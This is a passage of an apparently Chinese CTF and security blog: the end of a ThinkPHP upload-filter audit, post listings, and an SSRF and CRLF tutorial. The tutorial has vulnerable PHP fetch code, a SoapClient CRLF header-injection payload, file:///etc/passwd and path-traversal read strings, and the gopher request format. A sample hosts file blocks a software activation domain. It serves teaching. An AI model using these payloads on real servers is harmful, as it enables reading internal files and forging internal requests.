class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.<span class="title function_ invoke__">substr</span>(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>乍一看确实无懈可击，啥都拦截了，白名单也用上了</p>
<p>遇事不决，RTFM<br><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1876">直接进行一个手册的读</a><br>然后审审框架</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 默认上传配置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;mimes&#x27;</span>        =&gt; <span class="keyword">array</span>(), <span class="comment">//允许上传的文件MiMe类型</span></span><br><span class="line">    <span class="string">&#x27;maxSize&#x27;</span>      =&gt; <span class="number">0</span>, <span class="comment">//上传的文件大小限制 (0-不做限制)</span></span><br><span class="line">    <span class="string">&#x27;exts&#x27;</span>         =&gt; <span class="keyword">array</span>(), <span class="comment">//允许上传的文件后缀</span></span><br><span class="line">    <span class="string">&#x27;autoSub&#x27;</span>      =&gt; <span class="literal">true</span>, <span class="comment">//自动子目录保存文件</span></span><br><span class="line">    <span class="string">&#x27;subName&#x27;</span>      =&gt; <span class="keyword">array</span>(<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;Y-m-d&#x27;</span>), <span class="comment">//子目录创建方式，[0]-函数名，[1]-参数，多个参数使用数组</span></span><br><span class="line">    <span class="string">&#x27;rootPath&#x27;</span>     =&gt; <span class="string">&#x27;./Uploads/&#x27;</span>, <span class="comment">//保存根路径</span></span><br><span class="line">    <span class="string">&#x27;savePath&#x27;</span>     =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//保存路径</span></span><br><span class="line">    <span class="string">&#x27;saveName&#x27;</span>     =&gt; <span class="keyword">array</span>(<span class="string">&#x27;uniqid&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="comment">//上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组</span></span><br><span class="line">    <span class="string">&#x27;saveExt&#x27;</span>      =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//文件保存后缀，空则使用原后缀</span></span><br><span class="line">    <span class="string">&#x27;replace&#x27;</span>      =&gt; <span class="literal">false</span>, <span class="comment">//存在同名是否覆盖</span></span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span>         =&gt; <span class="literal">true</span>, <span class="comment">//是否生成hash编码</span></span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>     =&gt; <span class="literal">false</span>, <span class="comment">//检测文件是否存在回调，如果存在返回文件信息数组</span></span><br><span class="line">    <span class="string">&#x27;driver&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 文件上传驱动</span></span><br><span class="line">    <span class="string">&#x27;driverConfig&#x27;</span> =&gt; <span class="keyword">array</span>(), <span class="comment">// 上传驱动配置</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>emmm，找半天，没找到<code>allowExts</code>，感觉emmmm???</p>
<p>尼玛，看了半天. 不过现在一个问题就是文件传上去了该怎么访问？<br>文件名并不给我</p>
<h1 id="Refence"><a href="#Refence" class="headerlink" title="Refence"></a>Refence</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kenshinobiy/p/9165662.html">ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/119410335">ctfshow ThinkPHP篇—3.2.3</a></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted index-categories" href="/categories/web/">web</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/PHP/">PHP</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/ThinkPHP/">ThinkPHP</a></div><hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-03-14  <a class="commentCountImg" href="/2023/03/14/EJSssti/#comment-container"><span class="display-none-class">118bb7c9090e9425813f71486894b354</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="118bb7c9090e9425813f71486894b354">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>几秒  <i class="fas fa-pencil-alt"> </i>0.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/03/14/EJSssti/">hxpctf valentine</a></h1><div class="content"></div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/%E5%A4%8D%E7%8E%B0/">复现</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/ssti/">ssti</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/Javascript/">Javascript</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-02-17  <a class="commentCountImg" href="/2023/02/17/pyobfuscate/#comment-container"><span class="display-none-class">5838958335ad70e03648cdb0fa18abe1</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="5838958335ad70e03648cdb0fa18abe1">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/02/17/pyobfuscate/">pybofuscate反混淆</a></h1><div class="content">Welcome to my blog, enter password to read.</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted index-categories" href="/categories/reverse/">reverse</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/pyc/">pyc</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/%E5%8F%8D%E6%B7%B7%E6%B7%86/">反混淆</a></div><hr></div><div class="level is-mobile is-flex"><div class="level-start"><div class="level-item"><a class="article-more button is-small size-small" href="/2023/02/17/pyobfuscate/#more">阅读更多&gt;&gt;</a></div></div><div class="level-start"><div class="level-item has-text-grey is-size-7"><time datetime="2023-04-05T05:59:23.532Z"><i class="far fa-calendar-check"> 最后修改: </i>2023-04-05</time></div></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-02-16  <a class="commentCountImg" href="/2023/02/16/SSRF&amp;CRLF/#comment-container"><span class="display-none-class">f135512d75d9ded3686c7106bda8ee21</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="f135512d75d9ded3686c7106bda8ee21">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>21 分钟  <i class="fas fa-pencil-alt"> </i>3.1 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/02/16/SSRF&amp;CRLF/">CRLF + SSRF</a></h1><div class="content"><h1 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h1><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p>
<p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。 </p>
<p><img src="/./ssrf/1.png"></p>
<h1 id="一些前置知识"><a href="#一些前置知识" class="headerlink" title="一些前置知识"></a>一些前置知识</h1><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>在这里，给大家简单的介绍一下我们是怎么通过浏览器上网的</p>
<h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>和我们购物时候必须填写地址一样，在网络空间中我们也必须有一个属于自己的地址，而这个地址便是IP地址</p>
<p>IP地址有两大类，是IPv4和IPv6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">114.114.114.114                                 //ipv4</span><br><span class="line"></span><br><span class="line">2001:0000:0000:0000:0000:25de:0000:cafe         //ipv6</span><br></pre></td></tr></table></figure>

<p>v4所有地址已经被分配完毕，所以 有了ipv6这个东西。</p>
<p>又因为ipv6很长，看起来不太美观，于是有了更简洁的写法</p>
<ul>
<li><p>每项数字前导的0可以省略，省略后前导数字仍是0则继续，例如下组IPv6是等价的。</p>
<pre><code>  2001:0db8:02de:0000:0000:0000:0000:0e13
  2001:db8:2de:0000:0000:0000:0000:e13
  2001:db8:2de:000:000:000:000:e13
  2001:db8:2de:00:00:00:00:e13
  2001:db8:2de:0:0:0:0:e13
</code></pre>
</li>
<li><p>可以用双冒号“::”表示一组0或多组连续的0，但只能出现一次：</p>
<ul>
<li><p>如果四组数字都是零，可以被省略。遵照以上省略规则，下面这两组IPv6都是相等的。</p>
<pre><code>  2001:db8:2de:0:0:0:0:e13
  2001:db8:2de::e13

  2001:0db8:0000:0000:0000:0000:1428:57ab
  2001:0db8:0000:0000:0000::1428:57ab
  2001:0db8:0:0:0:0:1428:57ab
  2001:0db8:0::0:1428:57ab
  2001:0db8::1428:57ab
</code></pre>
</li>
<li><p>2001::25de::cade 是非法的，因为双冒号出现了两次。它有可能是下种情形之一，造成无法推断。</p>
<pre><code>  2001:0000:0000:0000:0000:25de:0000:cade
  2001:0000:0000:0000:25de:0000:0000:cade
  2001:0000:0000:25de:0000:0000:0000:cade
  2001:0000:25de:0000:0000:0000:0000:cade
</code></pre>
<p>  如果这个地址实际上是IPv4的地址，后32位可以用10进制数表示；因此::ffff:192.168.89.9 相等于::ffff:c0a8:5909。</p>
</li>
</ul>
</li>
</ul>
<h3 id="Hosts文件"><a href="#Hosts文件" class="headerlink" title="Hosts文件"></a>Hosts文件</h3><p>Hosts文件是一个没有扩展名的操作系统文件，以表的形式存储了主机名和IP地址的映射关系Hosts又称host table，译为“主机表”</p>
<p><img src="/./ssrf/12.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="line">#</span><br><span class="line"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="line">#</span><br><span class="line"># This file contains the mappings of IP addresses to host names. Each</span><br><span class="line"># entry should be kept on an individual line. The IP address should</span><br><span class="line"># be placed in the first column followed by the corresponding host name.</span><br><span class="line"># The IP address and the host name should be separated by at least one</span><br><span class="line"># space.</span><br><span class="line">#</span><br><span class="line"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="line"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span><br><span class="line">#</span><br><span class="line"># For example:</span><br><span class="line">#</span><br><span class="line">#      102.54.94.97     rhino.acme.com          # source server</span><br><span class="line">#       38.25.63.10     x.acme.com              # x client host</span><br><span class="line"></span><br><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line">#	127.0.0.1       localhost</span><br><span class="line">#	::1             localhost</span><br><span class="line">219.217.199.8 earth.local terratest.earth.local</span><br><span class="line">10.110.110.250 vpn.misakanetworks.cf</span><br><span class="line"># Added by Docker Desktop</span><br><span class="line">192.168.1.8 host.docker.internal</span><br><span class="line">192.168.1.8 gateway.docker.internal</span><br><span class="line"># To allow the same kube context to work on the host and the container:</span><br><span class="line">127.0.0.1 kubernetes.docker.internal</span><br><span class="line"># End of section</span><br><span class="line">127.0.0.1       activate.navicat.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以手动给一个Ip取一个好听的名字然后用这个名字访问，只需要按照host文件的格式在下面添加就行了</p>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>使用host是无法记住所有ip的，数据量太大了，而且日常上网也并不需要记住所有的ip，DNS就这样诞生了…</p>
<p>域名系统（英语：Domain Name System，缩写：DNS）</p>
<p>它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53</p>
<p><img src="/./ssrf/13.png"></p>
<h3 id="HTTP协议-1"><a href="#HTTP协议-1" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><strong>HTTP请求结构</strong></p>
<p>HTTP请求报文由3部分组成(请求行+请求头部+请求正文)</p>
<p><img src="https://s4.51cto.com/oss/202104/14/09f99b6430da1c84b40487e3794bdef7.png"></p>
<ul>
<li><p>请求行</p>
<p>  请求行： 是由 请求字段、URL字段、HTTP协议版本字段 三个字段组成，他们用空格分隔，例如：GET&#x2F;material&#x2F;index HTTP&#x2F;1.1\r\n根据HTTP标准，HTTP请求可以使用多种请求方法</p>
<p>  HTTP1.0定义了三种请求方法：GET，POST，HEAD方法。HTTP1.1新增了五种请求方法：OPTIONS，PUT，DELETE，TRACE，CONNECT方法</p>
</li>
</ul>
<p><img src="https://s5.51cto.com/oss/202104/14/52bc666e9533933003502ba0a191458d.png"></p>
<ul>
<li><p>请求头部</p>
<p>  请求头部： HTTP客户程序(例如浏览器)，向服务器发送请求的时候必须指明请求类型(一般是GET或者 POST)，如有必要，客户程序还可以选择发送其他的请求头。大多数请求头并不是必需的，但Content-Length除外，对于POST请求来说 Content-Length必须出现</p>
<p>  请求报头通知服务器关于客户端求求的信息，典型的请求头有：</p>
</li>
</ul>
<p><img src="https://s6.51cto.com/oss/202104/14/a2a12baeb24534c95a96fc2ef3859968.png"></p>
<ul>
<li><p>空行</p>
<p>他的作用是告诉服务器 请求头部信息到此为止</p>
</li>
<li><p>请求正文</p>
<p>  若方法是 GET，则该项为空。(数据都在url 地址栏里面)<br>  若方法是 post 字段，则通常放置的是要 提交的数据</p>
</li>
</ul>
<p>HTTP响应结构：</p>
<pre><code>HTTP的响应报文是由( 状态行、响应头部、响应正文) 三部分组成
</code></pre>
<p><img src="https://s5.51cto.com/oss/202104/14/47e94de26aef5787ea7ddaea2c3554b4.png"></p>
<ul>
<li><p>响应行</p>
<p>  响应行： 描述了响应的状态，一般由协议版本、状态码及其描述组成 比如 HTTP&#x2F;1.1200OK\r\n，其中协议版本HTTP&#x2F;1.1或者HTTP&#x2F;1.0，200就是它的状态码，OK则为它的描述。</p>
</li>
</ul>
<p>五种可能的取值：</p>
<p><img src="https://s5.51cto.com/oss/202104/14/b956f529ab21a5e24dddea2741021664.png"></p>
<p>常见状态码：</p>
<p>响应头部<br><img src="https://s2.51cto.com/oss/202104/14/e66cb5e0aeaf3fb80b5fbbe3cc61ba3f.png"></p>
<p>响应头部： 用于描述服务器的基本信息，以及数据的描述，服务器通过这些数据的描述信息，可以通知客户端如何处理等一会儿它回送的数据。</p>
<ul>
<li>响应体</li>
</ul>
<p>响应体就是响应的消息体，它包含了响应的内容。它可以包含HTML代码，图片，等等。主体是由传输在HTTP消息中紧跟在头部后面的数据字节组成的。</p>
<h1 id="SSRF中的常用协议"><a href="#SSRF中的常用协议" class="headerlink" title="SSRF中的常用协议"></a>SSRF中的常用协议</h1><h2 id="HTTP协议-2"><a href="#HTTP协议-2" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);  <span class="comment">//创造一个curl资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">//设置url和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">// 抓取url并将其传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">//关闭curl资源</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/./ssrf/5.png"></p>
<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/./ssrf/4.png"></p>
<p>可以看到，这个协议是一个比较底层的协议，从TCP手动构造一个http的请求，在这里出现了<code>\r\n</code>，这代表什么呢？</p>
<h3 id="CRLF和LF"><a href="#CRLF和LF" class="headerlink" title="CRLF和LF"></a>CRLF和LF</h3><p>CR(回车<code>\r</code>)，LF(换行<code>\n</code>)。</p>
<p>CR和LF是缩写，其实他们的全称分别是：”Carriage-Return”和”Line-Feed”。追本溯源的说，<strong>CR</strong>(Carriage-Return)和<strong>LF</strong>(Line-Feed)这两个词来源于打字机的发明和使用。</p>
<p>在很久以前的机械打字机时代，CR和LF分别具有不同的作用：LF会将打印纸张上移一行位置，但是保持当前打字的水平位置不变；CR则会将“Carriage”（打字机上的滚动托架）滚回到打印纸张的最左侧，但是保持当前打字的垂直位置不变，即还是在同一行。</p>
<p>当CR和LF组合使用时，则会将打印纸张上移一行，且下一个打字位置将回到该行的最左侧，也就是我们今天所理解的换行操作。</p>
<p>虽然现在机械打字机渐渐地退出了历史舞台。但是回车换行在计算机操作系统中确实必要的，而在计算机中回车换行实则为同样的结果，不再像打字机那样了，计算机的回车换行都是切换到下一行的行首位置了。在操作系统出现的年代，一些操作系统的设计者决定采用单个字符来表示换行符（也许是受限于内存和软盘空间的不足），如Unix的<code>LF</code>、MacIntosh的<code>CR</code>；但是想windows则是使用两个字符表示。他们的意图都是为了进行换行操作，只是当初并没有一个国际标准，所以才有这样字符上的不同。</p>
<p>在http中，则是用<code>\r\n</code>来表示换行<br><img src="/./ssrf/7.png"></p>
<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p>SOAP是简单对象访问协议，简单对象访问协议（Simple Object Access Protocol）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p>
<p>这里有个<code>Trick</code>：</p>
<p>正常情况下的SoapClient类，调用一个不存在的函数，会去调用<code>__call</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">not_exists_function</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/./ssrf/6.png"></p>
<p>基于刚才讲到的CRLF，则可以做到手动构造任意请求，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1:9999/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"><span class="variable">$payload</span> -&gt; <span class="title function_ invoke__">not_exists_function</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>file协议其实类似于任意文件读取，比如<code>file:///etc/passwd</code></p>
<p>还是刚才那段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);  <span class="comment">//创造一个curl资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">//设置url和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">// 抓取url并将其传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">//关闭curl资源</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./ssrf/11.png"></p>
<h2 id="file-get-contents-amp-readfile"><a href="#file-get-contents-amp-readfile" class="headerlink" title="file_get_contents() &amp; readfile()"></a>file_get_contents() &amp; readfile()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们可以传入一个url连接访问，也可以构造类似<code>?url=../../../../../etc/passwd</code>的paylaod即可读取服务器本地的任意文件</p>
<p><img src="/./ssrf/3.png"></p>
<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>gopher协议是一个古老且强大的协议，可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p>
<p>很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了。</p>
<p>gopher的协议格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</span><br><span class="line">&lt;port&gt;默认为70</span><br><span class="line">发起多条请求每条要用回车换行去隔开使用%0d%0a隔开，如果多个参数，参数之间的&amp;也需要进行URL编码</span><br></pre></td></tr></table></figure>
<p><img src="/./ssrf/8.png"></p>
